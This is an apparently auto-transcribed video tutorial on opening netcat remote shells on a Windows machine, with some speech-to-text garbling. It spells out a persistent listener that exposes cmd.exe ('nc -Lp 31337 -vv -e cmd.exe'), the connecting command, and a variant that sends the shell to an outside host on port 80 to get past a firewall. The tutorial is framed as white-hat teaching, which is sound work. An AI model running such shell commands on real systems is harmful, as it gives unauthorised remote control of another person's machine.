welcome to active the show will we break
down concepts tools and techniques for
hackers gurus and IT ninjas I'm Shannon
Morse and today I'm creating remote
shells in netcat in Windows so first off
what is a remote shell so this is a
command-line computer program that you
can use on all operating systems that
can execute shell commands as another
user on another computer or even on a
different network the remote system
connects and runs a remote shell daemon
using a common TCP port this is where we
get into a real-world scenario you can
use a remote shell to target a computer
for nefarious purposes or you can do it
just for real-world good like logging
files and troubleshooting now while I'm
not going to get into how to get a
victim to start a shell on their
computer without their knowledge I will
show you how to do a legit remote shell
for white hat use so let's go ahead and
prepare the Windows machine for a remote
shell so I'm going to get started on my
Windows machine over here let's go ahead
and open up terminal so we open our
command prompt and we change over to our
netcat directory so this is going to be
there it is so I can run nce eh and I
get my usual proms my usual information
about netcat now the next thing I will
type is going to be NC tak l lowercase P
3 1 3 3 7 our usual port tech VV tech e
and then at the end cmd.exe and go ahead
and hit run so it's listening on any 3 1
3 3 7 port so I'll go ahead and break
down all of this command for you
so first off it's going to open netcat
and then the capital L P the lowercase P
will put it into a persistent listening
mode so if you close netcat on one
machine for example my Linux machine
this listener port will stay open
indefinitely listening for a new entry
and then tech VV tells netcat to be
extra verbose with outputs which will be
useful for file transfers and things of
that nature
tacky opens the gaping security hole
that we all know and love and cmd.exe is
telling that cat that this executable
will be available on a remote machine
now I'll show you what to do on your
second machine next the hack shop is
hack fives premier store for all of your
pen testing needs including one of my
favorites the USB rubber ducky which
looks like a flash drive and it types
like a keyboard it could type scripts
into a computer ridiculously quickly
like my new favorite from forum user and
3w that reverses your mouse left and
right buttons this is so great for
pranking your coworkers now of course we
couldn't do the show without your
support so we would like to thank you
with something special you can use the
coupon code snubs with any order for
your very own signed hacked tip stickers
thanks again for supporting the show
and we're back now onto my Linux machine
I'm going to connect this Linux machine
over to my target computer the Windows
machine with this following command so I
opened up terminal and I'm going to type
in NC and then whatever my IP is for my
Windows machine in this case my IP
address is
10 70 3.30 1.59 and the same port number
as previously used 3 1 3 3 7 and hit
enter so what this will do is open net
cat and then connect to my Windows
machine on port 3 1 3 3 7 now once it
connects I can do all sorts of things
whether those are nefarious or whitehat
so for example I could type in something
simple like dir W / W and that will give
me my C Drive in Windows and information
about that and what kind of different
folders and different files are
available inside My Documents folder
because that's where I'm currently at on
terminal on my Windows machine one
example is I can make a new directory
with Md and then whatever I want the
directory called so I'll call it my bir
Munder so then if I choose /w dir /w
that should show me there it is
my dir now let's go back over to my
Windows machine real quick to take a
look and make sure that this actually
shows up on Windows as well to prove
that my remote shell is working so if I
go over here and I'm going to actually
go into the GUI this time click into My
Documents ok so I see my dir right here
so obviously you can make move files you
can remove things you can log files if
you want to all sorts of different fun
stuff so you can do everything that you
could ever want to in this remote shell
now netcat can also run a remote shell
from another port through a server
outside of a firewall so I don't
necessarily have to be on the same
at work for this to actually work so if
I wanted to run a command like this one
for example and see and then I could log
on to let's see let's say I have a Wi-Fi
pineapple running dot-com and I'm going
to use port 80 tech e and then cmd.exe
so if I was using that instead then I
can make an unencrypted tunnel from the
outside world now keep that in mind it
is unencrypted so you would always be
better off if you're going to do
something really important using SSH and
of course you can check out hack five to
see all of our tutorials about SSH now
do you use netcat what is your favorite
reason why do you use it and what do you
want to see me show you
as far as netcat goes make sure you send

sister show hack 5 for more great stuff
just like this thank you again for your
support and I'll be over there reminding
you to trust your Technol us</div></div><div class="container-fluid bottom-ad"><div id="amzn-assoc-ad-6a809dda-347a-4187-8a86-91faf94575da"></div><script async src="//z-na.amazon-adsystem.com/widgets/onejs?MarketPlace=US&amp;adInstanceId=6a809dda-347a-4187-8a86-91faf94575da"></script></div><div class="text-center">We are a participant in the Amazon Services LLC Associates Program, an affiliate advertising program designed to provide a means for us to earn fees by linking to Amazon.com and affiliated sites.</div><script>(function(w, d){
